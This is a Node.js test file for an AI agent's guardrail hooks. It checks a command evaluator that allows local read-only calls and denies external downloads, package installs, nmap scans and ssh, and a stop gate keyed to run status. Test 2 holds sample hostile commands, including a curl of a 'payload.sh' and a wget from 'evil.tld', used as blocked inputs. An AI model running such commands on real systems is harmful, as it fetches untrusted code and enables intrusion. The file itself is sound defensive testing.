#!/usr/bin/env node
'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { evaluateCommand } = require('./pre-tool-guardrail.cjs');
const { evaluateStopGate } = require('./stop-validator-gate.cjs');

function runTests() {
  let passed = 0;

  // Test 1: PreToolUse allows safe read-only commands and loopback curl
  assert.equal(evaluateCommand('ls -la /etc/nginx').decision, 'allow');
  assert.equal(evaluateCommand('curl -s http://127.0.0.1:8080/healthz').decision, 'allow');
  assert.equal(evaluateCommand('curl http://localhost:3000/api/status').decision, 'allow');
  passed++;

  // Test 2: PreToolUse blocks external network calls, ssh/nmap, and package installation
  assert.equal(evaluateCommand('curl https://example.com/payload.sh').decision, 'deny');
  assert.equal(evaluateCommand('wget https://evil.tld/bin').decision, 'deny');
  assert.equal(evaluateCommand('npm install express').decision, 'deny');
  assert.equal(evaluateCommand('pip install requests').decision, 'deny');
  assert.equal(evaluateCommand('nmap -sV 10.0.0.1').decision, 'deny');
  assert.equal(evaluateCommand('ssh root@192.168.1.50').decision, 'deny');
  passed++;

  // Test 3: Stop gate blocks in_progress runs and allows valid incomplete or non-audit runs
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agy-hook-test-'));
  try {
    // No run-metadata.json -> allow
    assert.equal(evaluateStopGate({ terminationReason: 'NO_TOOL_CALL' }, tmpDir).decision, 'allow');

    // in_progress -> continue (blocks stop)
    fs.writeFileSync(
      path.join(tmpDir, 'run-metadata.json'),
      JSON.stringify({ run_status: 'in_progress' }),
      'utf8'
    );
    const resInProgress = evaluateStopGate({ terminationReason: 'NO_TOOL_CALL' }, tmpDir);
    assert.equal(resInProgress.decision, 'continue');

    // incomplete with reason -> allow
    fs.writeFileSync(
      path.join(tmpDir, 'run-metadata.json'),
      JSON.stringify({
        run_status: 'incomplete',
        incomplete_reason: 'budget_cannot_fund_reconnaissance_and_reserves',
      }),
      'utf8'
    );
    const resIncomplete = evaluateStopGate({ terminationReason: 'NO_TOOL_CALL' }, tmpDir);
    assert.equal(resIncomplete.decision, 'allow');
    passed++;
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }

  console.log(`hooks.test.cjs: ${passed}/3 tests passed.`);
}

runTests();
